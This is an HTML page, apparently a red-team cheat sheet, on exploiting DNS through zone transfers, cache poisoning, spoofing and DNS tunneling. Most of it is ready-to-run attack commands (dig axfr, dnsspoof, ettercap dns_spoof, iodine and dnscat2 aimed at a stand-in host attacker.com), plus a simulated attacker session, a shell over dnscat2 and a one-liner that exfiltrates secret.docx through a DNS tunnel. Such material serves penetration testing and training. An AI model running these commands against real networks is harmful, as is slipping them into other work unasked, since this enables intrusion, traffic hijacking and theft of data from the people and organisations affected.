<!-- Title -->
<h1 class="text-2xl font-bold mb-2">DNS Exploitation</h1>
<p class="text-gray-300 mb-4">
  Domain: <strong>Network Security</strong> • Focus: <strong>DNS Attacks & Abuses</strong> • Last Updated: <strong>2025-09-05</strong>
</p>

<!-- Summary -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Summary</h2>
  <p class="text-gray-300">
    DNS (Domain Name System) is critical for resolving hostnames to IP addresses. 
    Attackers exploit DNS through misconfigurations, weak caching mechanisms, or by tunneling 
    data through DNS queries. Common exploitation methods include zone transfers, cache poisoning, 
    hijacking queries, and DNS tunneling for covert C2 communication. Compromise of DNS allows 
    adversaries to redirect, intercept, or exfiltrate data across networks stealthily.
  </p>
</section>

<!-- Why Exploitable -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
  <ul class="list-disc ml-5 text-gray-200 space-y-2">
    <li><strong>Zone Transfer Misconfigurations:</strong> DNS servers exposing internal records.</li>
    <li><strong>No DNSSEC:</strong> Allows cache poisoning and spoofing.</li>
    <li><strong>Recursive Resolution:</strong> Enables amplification and MITM attacks.</li>
    <li><strong>DNS Tunneling:</strong> Encodes data into DNS queries for stealth exfiltration.</li>
    <li><strong>Poor Monitoring:</strong> DNS logs rarely inspected, making attacks stealthy.</li>
  </ul>
</section>

<!-- How Exploitation Works -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li><strong>Discovery:</strong> Identify DNS servers and query exposed records.</li>
    <li><strong>Zone Transfers:</strong> Exploit AXFR to dump entire DNS databases.</li>
    <li><strong>Cache Poisoning:</strong> Inject malicious DNS records into resolvers.</li>
    <li><strong>DNS Hijacking:</strong> Redirect users to attacker-controlled servers.</li>
    <li><strong>DNS Tunneling:</strong> Establish covert channels using DNS queries/responses.</li>
  </ol>
</section>

<!-- Steps -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Steps</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li>Identify authoritative and recursive DNS servers.</li>
    <li>Attempt zone transfers (AXFR/IXFR) to gather records.</li>
    <li>Test for cache poisoning vulnerabilities.</li>
    <li>Perform hijacking via rogue/malicious DNS servers.</li>
    <li>Leverage DNS tunneling for stealth exfiltration and C2.</li>
  </ol>
</section>

<!-- Commands -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Commands</h2>
  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">

# ------------------------------
# Discovery
# ------------------------------
dig ns target.com                           # Identify nameservers
dig a target.com                            # Resolve A record
dig mx target.com                           # Mail server records

# ------------------------------
# Zone Transfer
# ------------------------------
dig axfr target.com @ns1.target.com         # Attempt full zone transfer
dig ixfr=1 target.com @ns1.target.com       # Incremental transfer

# ------------------------------
# Cache Snooping / Poisoning
# ------------------------------
dig @resolver target.com                    # Query via specific resolver
dnsspoof -i eth0                            # DNS spoofing on LAN
ettercap -T -q -M arp:remote /// /// -P dns_spoof

# ------------------------------
# DNS Tunneling (iodine / dnscat2)
# ------------------------------
iodine -f -r attacker.com                   # DNS tunnel server
iodine -f attacker.com                      # Client side tunnel
dnscat2-server attacker.com                 # Start DNS C2 server
dnscat2-client attacker.com                 # Client tunnel

# ------------------------------
# Example Workflow
# ------------------------------
dig ns corp.local                           # Find nameservers
dig axfr corp.local @192.168.1.53           # Attempt zone transfer
iodine -f attacker.com                      # Establish DNS tunnel
  </pre>
</section>

<!-- Real-World Exploitation Walkthrough -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to expand attacker session
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

[ saide ~ ]$ dig ns corp.local
;; ANSWER SECTION:
corp.local.    3600  IN NS ns1.corp.local.
corp.local.    3600  IN NS ns2.corp.local.

[ saide ~ ]$ dig axfr corp.local @192.168.1.53
;; Transfer successful
corp.local.       IN A   192.168.1.10
dc01.corp.local.  IN A   192.168.1.20
sql.corp.local.   IN A   192.168.1.30
vpn.corp.local.   IN A   192.168.1.40
mail.corp.local.  IN A   192.168.1.50

[ saide ~ ]$ dnsspoof -i eth0
dnsspoof: listening on eth0 [udp dst port 53 and src port 53]

[ saide ~ ]$ iodine -f -r attacker.com
Opened DNS tunnel on attacker.com
Connected client 192.168.1.100 → 10.0.0.2 via DNS

[ saide ~ ]$ # Victim resolves malicious DNS
ping intranet.corp.local
PING intranet.corp.local (192.168.1.50) 56(84) bytes of data.
    </pre>
  </details>
</section>

<!-- Example Results -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to view sample DNS exploitation results
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

# Successful Zone Transfer
corp.local.      IN A   192.168.1.10
dc01             IN A   192.168.1.20
sql              IN A   192.168.1.30
vpn              IN A   192.168.1.40
mail             IN A   192.168.1.50

# DNS Spoofing Output
Request: intranet.corp.local
Response: 192.168.1.50 (attacker-controlled)

# DNS Tunnel Session
[+] Client 192.168.1.100 connected
[+] Shell established through dnscat2
corp.local> whoami
corp\\jdoe

# Proof of Data Exfiltration
echo "secret.docx" | base64 | dnscat2-client attacker.com
[+] Exfiltrated secret.docx via DNS tunnel
    </pre>
  </details>
</section>

<!-- References -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
  <h2 class="text-lg font-semibold mb-2">References</h2>
  <ul class="list-disc ml-5 text-gray-200">
    <li>
      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        HackTricks – Pentesting DNS
      </a>
    </li>
    <li>
      <a href="https://attack.mitre.org/techniques/T1071/004/" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        MITRE ATT&CK – DNS Tunneling
      </a>
    </li>
    <li>Common Red Team workflow: Zone transfer → Internal Recon → DNS Tunneling for exfiltration.</li>
  </ul>
</section>
